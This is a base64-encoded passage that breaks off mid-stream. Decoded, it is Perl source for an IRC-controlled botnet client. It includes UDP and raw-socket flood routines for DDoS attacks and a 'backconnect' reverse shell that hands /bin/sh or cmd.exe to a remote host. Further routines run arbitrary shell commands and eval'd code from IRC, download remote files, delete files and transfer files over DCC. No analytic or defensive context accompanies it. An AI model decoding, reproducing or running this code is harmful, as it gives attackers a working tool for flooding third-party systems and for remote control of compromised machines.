YXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyU2NhbiBDb21wbGF0ZVwwMDNcMDAyIik7DQogICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCJQUklWTVNHICRwcmludGwgOlwwMDJcMDAzMTJObyBwb3J0cyBmb3VuZC4uXDAwMiIpOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICMgUmVtb3ZlDQogICAgICBlbHNpZiAoJGZ1bmNhcmcgPX4gL15ybS8pDQogICAgICB7DQogICAgICAgICBzeXN0ZW0oImNkIC92YXIvdG1wIDsgcm0gLXJmIGNiIGZpbmQgZ29kKiB3dW5kZXIqIHVkZXYqIGxpYioiKTsNCiAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyKFF1aWNrZGVsKVwwMDJcMDAzMTQgUmVtb3ZlZCBmaWxlcyBhbmQgZm9sZGVycyAiKTsNCiAgICAgIH0NCiAgICAgICMgVmVyc2lvbg0KICAgICAgZWxzaWYgKCRmdW5jYXJnID1+IC9edmVyc2lvbi8pDQogICAgICB7DQogICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6XDAwMlwwMDMxMihWZXJzaW9uKVwwMDJcMDAzMTQgJHZlcnNpb24gIik7DQogICAgICB9DQogICAgICAjIERvd25sb2FkDQogICAgICAgICAgIGVsc2lmICgkZnVuY2FyZyA9fiAvXmRvd25ccysoLiopXHMrKC4qKS8pDQogICAgICB7DQogICAgICAgICAgICAgIGdldHN0b3JlKCIkMSIsICIkMiIpOw0KICAgICAgICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6XDAwMlwwMDMxMihEb3dubG9hZClcMDAyXDAwMzE0IFBhZ2U6ICQyIChGaWxlOiAkMSkiKSBpZiAoJHhzdGF0cyk7DQogICAgICAgICAgIH0NCiAgICAgICAjIFVkcA0KICAgICAgICAgICAgZWxzaWYgKCRmdW5jYXJnID1+IC9edWRwXHMrKC4qKVxzKyhcZCspXHMrKFxkKykvKSB7DQogICAgICAgICAgICAgIHJldHVybiB1bmxlc3MgJHBhY290ZXM7DQogICAgICAgICAgICAgIHNvY2tldChUcjB4LCBQRl9JTkVULCBTT0NLX0RHUkFNLCAxNyk7DQogICAgICAgICAgICAgIG15ICRhbHZvPWluZXRfYXRvbigiJDEiKTsNCiAgICAgICAgICAgICAgbXkgJHBvcnRhID0gIiQyIjsNCiAgICAgICAgICAgICAgbXkgJHRlbXBvID0gIiQzIjsNCiAgICAgICAgICAgICAgbXkgJHBhY290ZTsNCiAgICAgICAgICAgICAgbXkgJHBhY290ZXNlOw0KICAgICAgICAgICAgICBteSAkZmltID0gdGltZSArICR0ZW1wbzsNCiAgICAgICAgICAgICAgbXkgJHBhY290YSA9IDE7DQogICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6XDAwMlwwMDMxMihVRFAgRERvU2luZylcMDAzIEF0dGFja2luZ1wwMDI6ICQxIC0gXDAwMlRpbWVcMDAyOiAkdGVtcG8iLiJzZWNvbmRzIik7DQogICAgICAgICAgICAgIHdoaWxlICgoJHBhY290YSA9PSAiMSIpICYmICgkcGFjb3RlcyA9PSAiMSIpKSB7DQogICAgICAgICAgICAgICAgJHBhY290YSA9IDAgaWYgKCh0aW1lID49ICRmaW0pICYmICgkdGVtcG8gIT0gIjAiKSk7DQogICAgICAgICAgICAgICAgJHBhY290ZT0kcmFuZCB4ICRyYW5kIHggJHJhbmQ7DQogICAgICAgICAgICAgICAgJHBvcnRhID0gaW50KHJhbmQgNjUwMDApICsxIGlmICgkcG9ydGEgPT0gIjAiKTsNCiAgICAgICAgICAgICAgICBzZW5kKFRyMHgsIDAsICRwYWNvdGUsIHNvY2thZGRyX2luKCRwb3J0YSwgJGFsdm8pKSBhbmQgJHBhY290ZXNlKysgaWYgKCRwYWNvdGVzID09ICIxIik7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgaWYgKCR4c3RhdHMpDQogICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyKFVEUCBDb21wbGV0ZSk6XDAwM1wwMDIgJDEgLSBcMDAyU2VuZHRcMDAyOiAkcGFjb3Rlc2UiLiJrYiAtIFwwMDJUaW1lXDAwMjogJHRlbXBvIi4ic2Vjb25kcyIpOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICMgQmFja2Nvbm5lY3QNCiAgICAgICAgICAgIGVsc2lmICgkZnVuY2FyZyA9fiAvXmJhY2tccysoLiopXHMrKFxkKykvKSB7DQogICAgICAgICAgICAgIG15ICRob3N0ID0gIiQxIjsNCiAgICAgICAgICAgICAgbXkgJHBvcnRhID0gIiQyIjsNCiAgICAgICAgICAgICAgbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0KICAgICAgICAgICAgICBteSAkaWFkZHIgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgICAgICAgICBteSAkcGFkZHIgPSBzb2NrYWRkcl9pbigkcG9ydGEsICRpYWRkcik7DQogICAgICAgICAgICAgIG15ICRzaGVsbCA9ICIvYmluL3NoIC1pIjsNCiAgICAgICAgICAgICAgaWYgKCReTyBlcSAiTVNXaW4zMiIpIHsNCiAgICAgICAgICAgICAgICAkc2hlbGwgPSAiY21kLmV4ZSI7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgb3IgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAgICAgICAgICAgY29ubmVjdChTT0NLRVQsICRwYWRkcikgb3IgZGllICJjb25uZWN0OiAkISI7DQogICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6XDAwMlt4XSAtPlwwMDM0IEluamVjdGlvbiAuLi4iKTsNCiAgICAgICAgICAgICAgb3BlbihTVERJTiwgIj4mU09DS0VUIik7DQogICAgICAgICAgICAgIG9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCiAgICAgICAgICAgICAgb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOw0KICAgICAgICAgICAgICBzeXN0ZW0oIiRzaGVsbCIpOw0KICAgICAgICAgc3lzdGVtKCJjZCAvdG1wLy5tcngiKTsNCiAgICAgICAgICAgICAgY2xvc2UoU1RESU4pOw0KICAgICAgICAgICAgICBjbG9zZShTVERPVVQpOw0KICAgICAgICAgICAgICBjbG9zZShTVERFUlIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICBleGl0Ow0KICAgICAgIH0NCiAgfQ0KfQ0KDQpzdWIgaXJjYXNlIHsNCiAgbXkgKCRrZW0sICRwcmludGwsICRjYXNlKSA9IEBfOw0KDQogICBpZiAoJGNhc2UgPX4gL15qb2luICguKikvKSB7DQogICAgIGooIiQxIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15wYXJ0ICguKikvKSB7DQogICAgICBwKCIkMSIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ecmVqb2luXHMrKC4qKS8pIHsNCiAgICAgIG15ICRjaGFuID0gJDE7DQogICAgICBpZiAoJGNoYW4gPX4gL14oXGQrKSAoLiopLykgew0KICAgICAgICBmb3IgKG15ICRjYSA9IDE7ICRjYSA8PSAkMTsgJGNhKysgKSB7DQogICAgICAgICAgcCgiJDIiKTsNCiAgICAgICAgICBqKCIkMiIpOw0KICAgICAgICB9DQogICAgICB9IGVsc2Ugew0KICAgICAgICAgIHAoIiRjaGFuIik7DQogICAgICAgICAgaigiJGNoYW4iKTsNCiAgICAgIH0NCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXm9wLykgew0KICAgICAgb3AoIiRwcmludGwiLCAiJGtlbSIpIGlmICRjYXNlIGVxICJvcCI7DQogICAgICBteSAkb2FyZyA9IHN1YnN0cigkY2FzZSwgMyk7DQogICAgICBvcCgiJDEiLCAiJDIiKSBpZiAoJG9hcmcgPX4gLyhcUyspXHMrKFxTKykvKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXmRlb3AvKSB7DQogICAgICBkZW9wKCIkcHJpbnRsIiwgIiRrZW0iKSBpZiAkY2FzZSBlcSAiZGVvcCI7DQogICAgICBteSAkb2FyZyA9IHN1YnN0cigkY2FzZSwgNSk7DQogICAgICBkZW9wKCIkMSIsICIkMiIpIGlmICgkb2FyZyA9fiAvKFxTKylccysoXFMrKS8pOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9edm9pY2UvKSB7DQogICAgICB2b2ljZSgiJHByaW50bCIsICIka2VtIikgaWYgJGNhc2UgZXEgInZvaWNlIjsNCiAgICAgICRvYXJnID0gc3Vic3RyKCRjYXNlLCA2KTsNCiAgICAgIHZvaWNlKCIkMSIsICIkMiIpIGlmICgkb2FyZyA9fiAvKFxTKylccysoXFMrKS8pOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eZGV2b2ljZS8pIHsNCiAgICAgIGRldm9pY2UoIiRwcmludGwiLCAiJGtlbSIpIGlmICRjYXNlIGVxICJkZXZvaWNlIjsNCiAgICAgICRvYXJnID0gc3Vic3RyKCRjYXNlLCA4KTsNCiAgICAgIGRldm9pY2UoIiQxIiwgIiQyIikgaWYgKCRvYXJnID1+IC8oXFMrKVxzKyhcUyspLyk7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15tc2dccysoXFMrKSAoLiopLykgew0KICAgICAgbXNnKCIkMSIsICIkMiIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eZmxvb2RccysoXGQrKVxzKyhcUyspICguKikvKSB7DQogICAgICBmb3IgKG15ICRjZiA9IDE7ICRjZiA8PSAkMTsgJGNmKyspIHsNCiAgICAgICAgbXNnKCIkMiIsICIkMyIpOw0KICAgICAgfQ0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eY3RjcGZsb29kXHMrKFxkKylccysoXFMrKSAoLiopLykgew0KICAgICAgZm9yIChteSAkY2YgPSAxOyAkY2YgPD0gJDE7ICRjZisrKSB7DQogICAgICAgIGN0Y3AoIiQyIiwgIiQzIik7DQogICAgICB9DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15jdGNwXHMrKFxTKykgKC4qKS8pIHsNCiAgICAgIGN0Y3AoIiQxIiwgIiQyIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15pbnZpdGVccysoXFMrKSAoLiopLykgew0KICAgICAgaW52aXRlKCIkMSIsICIkMiIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eZWNoby8pIHsNCiAgICAgIHN5c3RlbSgiZWNobyAkbWV1bmljayA+IGBwd2RgL2JvdG5pY2siKTsNCiAgICAgIG1zZygiZG9uZSIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ebmljayAoLiopLykgew0KICAgICAgbmljaygiJDEiKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXmp1bXBccysoXFMrKVxzKyhcUyspLykgew0KICAgICAgIGNvbmVjdGFyKCIkMiIsICIkMSIsIDY2NjcpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ec2VuZFxzKyhcUyspXHMrKFxTKykvKSB7DQogICAgICBEQ0M6OlNFTkQoIiQxIiwgIiQyIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15yYXcgKC4qKS8pIHsNCiAgICAgIHNlbmRyYXcoIiQxIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15ldmFsICguKikvKSB7DQogICAgICBldmFsICIkMSI7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15yalxzKyhcUyspXHMrKFxkKykvKSB7DQogICAgc2xlZXAgaW50KHJhbmQoJDIpKTsNCiAgICBqKCIkMSIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ecnBccysoXFMrKVxzKyhcZCspLykgew0KICAgIHNsZWVwIGludChyYW5kKCQyKSk7DQogICAgcCgiJDEiKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXnF1aXQvKSB7DQogICAgIHF1aXQoKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXnJhbmQvKSB7DQogICAgbXkgJG5vdm9uaWNrID0gZ2V0bmljaygpOw0KICAgICBuaWNrKCIkbm92b25pY2siKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXnN0YXQgKC4qKS8pIHsNCiAgICAgaWYgKCQxIGVxICJvbiIpIHsNCiAgICAgICR4c3RhdHMgPSAxOw0KICAgICAgbXNnKCIkcHJpbnRsIiwgIlNhdHVzIGVuYWJsZWQiKTsNCiAgICAgfSBlbHNpZiAoJDEgZXEgIm9mZiIpIHsNCiAgICAgICR4c3RhdHMgPSAwOw0KICAgICAgbXNnKCIkcHJpbnRsIiwgIlN0YXR1cyBkaXNhYmxlIik7DQogICAgIH0NCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXmJhbmcgKC4qKS8pIHsNCiAgICAgaWYgKCQxIGVxICJvbiIpIHsNCiAgICAgICRwYWNvdGVzID0gMTsNCiAgICAgIG1zZygiJHByaW50bCIsICJbeF0gQmFuZyBtb2RlIGVuYWJsZWQiKSBpZiAoJHhzdGF0cyA9PSAiMSIpOw0KICAgICB9IGVsc2lmICgkMSBlcSAib2ZmIikgew0KICAgICAgJHBhY290ZXMgPSAwOw0KICAgICAgbXNnKCIkcHJpbnRsIiwgIlt4XSBCYW5nIG1vZGUgZGlzYWJsZWQiKSBpZiAoJHhzdGF0cyA9PSAiMSIpOw0KICAgICB9DQogICB9DQp9DQpzdWIgc2hlbGwgew0KICByZXR1cm4gdW5sZXNzICRzaGVsbGFjY2VzczsNCiAgbXkgJHByaW50bD0kX1swXTsNCiAgbXkgJGNvbWFuZG89JF9bMV07DQogIGlmICgkY29tYW5kbyA9fiAvY2QgKC4qKS8pIHsNCiAgICBjaGRpcigiJDEiKSB8fCBtc2coIiRwcmludGwiLCAiY2Q6ICQxIi4iOiBObyBzdWNoIGZpbGUgb3IgZGlyZWN0b3J5Iik7DQogICAgcmV0dXJuOw0KICB9DQogIGVsc2lmICgkcGlkID0gZm9yaykgew0KICAgICB3YWl0cGlkKCRwaWQsIDApOw0KICB9IGVsc2Ugew0KICAgICAgaWYgKGZvcmspIHsNCiAgICAgICAgIGV4aXQ7DQogICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgbXkgQHJlc3A9YCRjb21hbmRvIDI+JjEgMz4mMWA7DQogICAgICAgICAgIG15ICRjPTA7DQogICAgICAgICAgIGZvcmVhY2ggbXkgJGxpbmhhIChAcmVzcCkgew0KICAgICAgICAgICAgICRjKys7DQogICAgICAgICAgICAgY2hvcCAkbGluaGE7DQogICAgICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOiRsaW5oYSIpOw0KICAgICAgICAgICAgIGlmICgkYyA+PSAiJGxpbmFzX21heCIpIHsNCiAgICAgICAgICAgICAgICRjPTA7DQogICAgICAgICAgICAgICBzbGVlcCAkc2xlZXA7DQogICAgICAgICAgICAgfQ0KICAgICAgICAgICB9DQogICAgICAgICAgIGV4aXQ7DQogICAgICAgfQ0KICB9DQp9DQoNCnN1YiBhdHRhY2tlciB7DQogIG15ICRpYWRkciA9IGluZXRfYXRvbigkX1swXSk7DQogIG15ICRtc2cgPSAnQicgeCAkX1sxXTsNCiAgbXkgJGZ0aW1lID0gJF9bMl07DQogIG15ICRjcCA9IDA7DQogIG15ICglcGFjb3Rlcyk7DQogICRwYWNvdGVze2ljbXB9ID0gJHBhY290ZXN7aWdtcH0gPSAkcGFjb3Rlc3t1ZHB9ID0gJHBhY290ZXN7b30gPSAkcGFjb3Rlc3t0Y3B9ID0gMDsNCg0KICBzb2NrZXQoU09DSzEsIFBGX0lORVQsIFNPQ0tfUkFXLCAyKSBvciAkY3ArKzsNCiAgc29ja2V0KFNPQ0syLCBQRl9JTkVULCBTT0NLX0RHUkFNLCAxNykgb3IgJGNwKys7DQogIHNvY2tldChTT0NLMywgUEZfSU5FVCwgU09DS19SQVcsIDEpIG9yICRjcCsrOw0KICBzb2NrZXQoU09DSzQsIFBGX0lORVQsIFNPQ0tfUkFXLCA2KSBvciAkY3ArKzsNCiAgcmV0dXJuKHVuZGVmKSBpZiAkY3AgPT0gNDsNCiAgbXkgJGl0aW1lID0gdGltZTsNCiAgbXkgKCRjdXJfdGltZSk7DQogIHdoaWxlICggMSApIHsNCiAgICAgZm9yIChteSAkcG9ydGEgPSAxOyAkcG9ydGEgPD0gNjU1MzU7ICRwb3J0YSsrKSB7DQogICAgICAgJGN1cl90aW1lID0gdGltZSAtICRpdGltZTsNCiAgICAgICBsYXN0IGlmICRjdXJfdGltZSA+PSAkZnRpbWU7DQogICAgICAgc2VuZChTT0NLMSwgJG1zZywgMCwgc29ja2FkZHJfaW4oJHBvcnRhLCAkaWFkZHIpKSBhbmQgJHBhY290ZXN7aWdtcH0rKyBpZiAoJHBhY290ZXMgPT0gMSk7DQogICAgICAgc2VuZChTT0NLMiwgJG1zZywgMCwgc29ja2FkZHJfaW4oJHBvcnRhLCAkaWFkZHIpKSBhbmQgJHBhY290ZXN7dWRwfSsrIGlmICgkcGFjb3RlcyA9PSAxKTsNCiAgICAgICBzZW5kKFNPQ0szLCAkbXNnLCAwLCBzb2NrYWRkcl9pbigkcG9ydGEsICRpYWRkcikpIGFuZCAkcGFjb3Rlc3tpY21wfSsrIGlmICgkcGFjb3RlcyA9PSAxKTsNCiAgICAgICBzZW5kKFNPQ0s0LCAkbXNnLCAwLCBzb2NrYWRkcl9pbigkcG9ydGEsICRpYWRkcikpIGFuZCAkcGFjb3Rlc3t0Y3B9KysgaWYgKCRwYWNvdGVzID09IDEpOw0KICAgICAgIGZvciAobXkgJHBjID0gMzsgJHBjIDw9IDI1NTskcGMrKykgew0KICAgICAgICAgbmV4dCBpZiAkcGMgPT0gNjsNCiAgICAgICAgICRjdXJfdGltZSA9IHRpbWUgLSAkaXRpbWU7DQogICAgICAgICBsYXN0IGlmICRjdXJfdGltZSA+PSAkZnRpbWU7DQogICAgICAgICBzb2NrZXQoU09DSzUsIFBGX0lORVQsIFNPQ0tfUkFXLCAkcGMpIG9yIG5leHQ7DQogICAgICAgICBzZW5kKFNPQ0s1LCAkbXNnLCAwLCBzb2NrYWRkcl9pbigkcG9ydGEsICRpYWRkcikpIGFuZCAkcGFjb3Rlc3tvfSsrIGlmICgkcGFjb3RlcyA9PSAxKTsNCiAgICAgICB9DQogICAgIH0NCiAgICAgbGFzdCBpZiAkY3VyX3RpbWUgPj0gJGZ0aW1lOw0KICB9DQogIHJldHVybigkY3VyX3RpbWUsICVwYWNvdGVzKTsNCn0NCg0Kc3ViIGFjdGlvbiB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiUFJJVk1TRyAkX1swXSA6XDAwMUFDVElPTiAkX1sxXVwwMDEiKTsNCn0NCnN1YiBjdGNwIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJQUklWTVNHICRfWzBdIDpcMDAxJF9bMV1cMDAxIik7DQp9DQpzdWIgbXNnIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJQUklWTVNHICRfWzBdIDokX1sxXSIpOw0KfQ0Kc3ViIG5vdGljZSB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiTk9USUNFICRfWzBdIDokX1sxXSIpOw0KfQ0Kc3ViIG9wIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdICtvICRfWzFdIik7DQp9DQpzdWIgZGVvcCB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiTU9ERSAkX1swXSAtbyAkX1sxXSIpOw0KfQ0Kc3ViIGhvcCB7DQogICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIk1PREUgJF9bMF0gK2ggJF9bMV0iKTsNCn0NCnN1YiBkZWhvcCB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiTU9ERSAkX1swXSAraCAkX1sxXSIpOw0KfQ0Kc3ViIHZvaWNlIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdICt2ICRfWzFdIik7DQp9DQpzdWIgZGV2b2ljZSB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiTU9ERSAkX1swXSAtdiAkX1sxXSIpOw0KfQ0Kc3ViIGJhbiB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiTU9ERSAkX1swXSArYiAkX1sxXSIpOw0KfQ0Kc3ViIHVuYmFuIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdIC1iICRfWzFdIik7DQp9DQpzdWIga2ljayB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiS0lDSyAkX1swXSAkX1sxXSA6JF9bMl0iKTsNCn0NCnN1YiBtb2RvIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDA7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdICRfWzFdIik7DQp9DQpzdWIgbW9kZSB7IG1vZG8oQF8pOyB9DQpzdWIgaiB7ICZqb2luKEBfKTsgfQ0Kc3ViIGpvaW4gew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMDsNCiAgIHNlbmRyYXcoIkpPSU4gJF9bMF0iKTsNCn0NCnN1YiBwIHsgcGFydChAXyk7IH0NCnN1YiBwYXJ0IHtzZW5kcmF3KCJQQVJUICRfWzBdIik7fQ0Kc3ViIG5pY2sgew0KICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOw0KICBzZW5kcmF3KCJOSUNLICRfWzBdIik7DQp9DQpzdWIgaW52aXRlIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJJTlZJVEUgJF9bMV0gJF9bMF0iKTsNCn0NCnN1YiB0b3BpY28gew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIlRPUElDICRfWzBdICRfWzFdIik7DQp9DQpzdWIgdG9waWMgeyB0b3BpY28oQF8pOyB9DQpzdWIgd2hvaXMgew0KICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOw0KICBzZW5kcmF3KCJXSE9JUyAkX1swXSIpOw0KfQ0Kc3ViIHdobyB7DQogIHJldHVybiB1bmxlc3MgJCNfID09IDA7DQogIHNlbmRyYXcoIldITyAkX1swXSIpOw0KfQ0Kc3ViIG5hbWVzIHsNCiAgcmV0dXJuIHVubGVzcyAkI18gPT0gMDsNCiAgc2VuZHJhdygiTkFNRVMgJF9bMF0iKTsNCn0NCnN1YiBhd2F5IHsNCiAgc2VuZHJhdygiQVdBWSAkX1swXSIpOw0KfQ0Kc3ViIGJhY2sgeyBhd2F5KCk7IH0NCnN1YiBxdWl0IHsNCiAgc2VuZHJhdygiUVVJVCA6JF9bMF0iKTsNCiAgZXhpdDsNCn0NCg0KcGFja2FnZSBEQ0M7DQpzdWIgY29ubmVjdGlvbnMgew0KICAgbXkgQHJlYWR5ID0gJGRjY19zZWwtPmNhbl9yZWFkKDEpOw0KIyAgIHJldHVybiB1bmxlc3MgKEByZWFkeSk7DQogICBmb3JlYWNoIG15ICRmaCAoQHJlYWR5KSB7DQogICAgIG15ICRkY2N0aXBvID0gJERDQ3skZmh9e3RpcG99Ow0KICAgICBteSAkYXJxdWl2byA9ICREQ0N7JGZofXthcnF1aXZvfTsNCiAgICAgbXkgJGJ5dGVzID0gJERDQ3skZmh9e2J5dGVzfTsNCiAgICAgbXkgJGN1cl9ieXRlID0gJERDQ3skZmh9e2N1cmJ5dGV9Ow0KICAgICBteSAkbmljayA9ICREQ0N7JGZofXtuaWNrfTsNCiAgICAgbXkgJG1zZzsNCiAgICAgbXkgJG5yZWFkID0gc3lzcmVhZCgkZmgsICRtc2csIDEwMjQwKTsNCiAgICAgaWYgKCRucmVhZCA9PSAwIGFuZCAkZGNjdGlwbyA9fiAvXihnZXR8c2VuZGNvbikkLykgew0KICAgICAgICAkRENDeyRmaH17c3RhdHVzfSA9ICJDYW5jZWxhZG8iOw0KICAgICAgICAkRENDeyRmaH17ZnRpbWV9ID0gdGltZTsNCiAgICAgICAgJGRjY19zZWwtPnJlbW92ZSgkZmgpOw0KICAgICAgICAkZmgtPmNsb3NlOw0KICAgICAgICBuZXh0Ow0KICAgICB9DQogICAgIGlmICgkZGNjdGlwbyBlcSAiZ2V0Iikgew0KICAgICAgICAkRENDeyRmaH17Y3VyYnl0ZX0gKz0gbGVuZ3RoKCRtc2cpOw0KDQogICAgICAgIG15ICRjdXJfYnl0ZSA9ICREQ0N7JGZofXtjdXJieXRlfTsNCg0KICAgICAgICBvcGVuKEZJTEUsICI+PiAkYXJxdWl2byIpOw0KICAgICAgICBwcmludCBGSUxFICIkbXNnIiBpZiAoJGN1cl9ieXRlIDw9ICRieXRlcyk7DQogICAgICAgIGNsb3NlKEZJTEUpOw0KDQogICAgICAgIG15ICRwYWNrYnl0ZSA9IHBhY2soIk4iLCAkY3VyX2J5dGUpOw0KICAgICAgICBwcmludCAkZmggIiRwYWNrYnl0ZSI7DQoNCiAgICAgICAgaWYgKCRieXRlcyA9PSAkY3VyX2J5dGUpIHsNCiAgICAgICAgICAgJGRjY19zZWwtPnJlbW92ZSgkZmgpOw0KICAgICAgICAgICAkZmgtPmNsb3NlOw0KICAgICAgICAgICAkRENDeyRmaH17c3RhdHVzfSA9ICJSZWNlYmlkbyI7DQogICAgICAgICAgICREQ0N7JGZofXtmdGltZX0gPSB0aW1lOw0KICAgICAgICAgICBuZXh0Ow0KICAgICAgICB9DQogICAgIH0gZWxzaWYgKCRkY2N0aXBvIGVxICJzZW5kIikgew0KICAgICAgICAgIG15ICRzZW5kID0gJGZoLT5hY2NlcHQ7DQogICAgICAgICAgJHNlbmQtPmF1dG9mbHVzaCgxKTsNCiAgICAgICAgICAkZGNjX3NlbC0+YWRkKCRzZW5kKTsNCiAgICAgICAgICAkZGNjX3NlbC0+cmVtb3ZlKCRmaCk7DQogICAgICAgICAgJERDQ3skc2VuZH17dGlwb30gPSAnc2VuZGNvbic7DQogICAgICAgICAgJERDQ3skc2VuZH17aXRpbWV9ID0gdGltZTsNCiAgICAgICAgICAkRENDeyRzZW5kfXtuaWNrfSA9ICRuaWNrOw0KICAgICAgICAgICREQ0N7JHNlbmR9e2J5dGVzfSA9ICRieXRlczsNCiAgICAgICAgICAkRENDeyRzZW5kfXtjdXJieXRlfSA9IDA7DQogICAgICAgICAgJERDQ3skc2VuZH17YXJxdWl2b30gPSAkYXJxdWl2bzsNCiAgICAgICAgICAkRENDeyRzZW5kfXtpcH0gPSAkc2VuZC0+cGVlcmhvc3Q7DQogICAgICAgICAgJERDQ3skc2VuZH17cG9ydGF9ID0gJHNlbmQtPnBlZXJwb3J0Ow0KICAgICAgICAgICREQ0N7JHNlbmR9e3N0YXR1c30gPSAiRW52aWFuZG8iOw0KICAgICAgICAgIG9wZW4oRklMRSwgIjwgJGFycXVpdm8iKTsNCiAgICAgICAgICBteSAkZmJ5dGVzOw0KICAgICAgICAgIHJlYWQoRklMRSwgJGZieXRlcywgMTAyNCk7DQogICAgICAgICAgcHJpbnQgJHNlbmQgIiRmYnl0ZXMiOw0KICAgICAgICAgIGNsb3NlIEZJTEU7DQojICAgICAgICAgIGRlbGV0ZSgkRENDeyRmaH0pOw0KICAgICB9IGVsc2lmICgkZGNjdGlwbyBlcSAnc2VuZGNvbicpIHsNCiAgICAgICAgICBteSAkYnl0ZXNfc2VuZGVkID0gdW5wYWNrKCJOIiwgJG1zZyk7DQogICAgICAgICAgJERDQ3skZmh9e2N1cmJ5dGV9ID0gJGJ5dGVzX3NlbmRlZDsNCiAgICAgICAgICBpZiAoJGJ5dGVzX3NlbmRlZCA9PSAkYnl0ZXMpIHsNCiAgICAgICAgICAgICAkZmgtPmNsb3NlOw0KICAgICAgICAgICAgICRkY2Nfc2VsLT5yZW1vdmUoJGZoKTsNCiAgICAgICAgICAgICAkRENDeyRmaH17c3RhdHVzfSA9ICJFbnZpYWRvIjsNCiAgICAgICAgICAgICAkRENDeyRmaH17ZnRpbWV9ID0gdGltZTsNCiAgICAgICAgICAgICBuZXh0Ow0KICAgICAgICAgIH0NCiAgICAgICAgICBvcGVuKFNFTkRGSUxFLCAiPCAkYXJxdWl2byIpOw0KICAgICAgICAgIHNlZWsoU0VOREZJTEUsICRieXRlc19zZW5kZWQsIDApOw0KIC